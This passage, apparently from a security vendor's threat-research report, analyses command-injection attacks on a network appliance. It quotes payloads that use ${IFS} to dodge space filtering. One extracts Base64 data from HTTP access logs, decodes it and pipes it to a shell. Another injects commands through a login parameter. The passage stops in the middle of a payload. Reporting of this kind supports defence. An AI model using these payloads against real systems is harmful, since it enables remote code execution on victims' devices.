  sed${IFS}'s/.*INDEX://;s/".*//'|b64decode${IFS}-r|sh;# XShell commands appended to the forged failure text were designed to instruct the appliance to search HTTP access logs for the&nbsp;INDEX: marker, extract the Base64-encoded data, decode it, and pass the result to a command interpreter to execute.Several variants used&nbsp;${IFS} (Internal Field Separator, which in bash can represent a space, tab, or newline character)&nbsp;in place of literal spaces. This preserved separation between command arguments while avoiding spaces that might be transformed or rejected during request processing.&nbsp; Inline exploitation variantsIn addition to the staged Base64-encoded payload, ThreatLabz captured a shorter inline variant in the&nbsp;login parameter.Inline variant 1:pitboss PPE unexpectedly died NSPPE;mkdir${IFS}-p${IFS}/var/vpn/bookmark/${IFS}
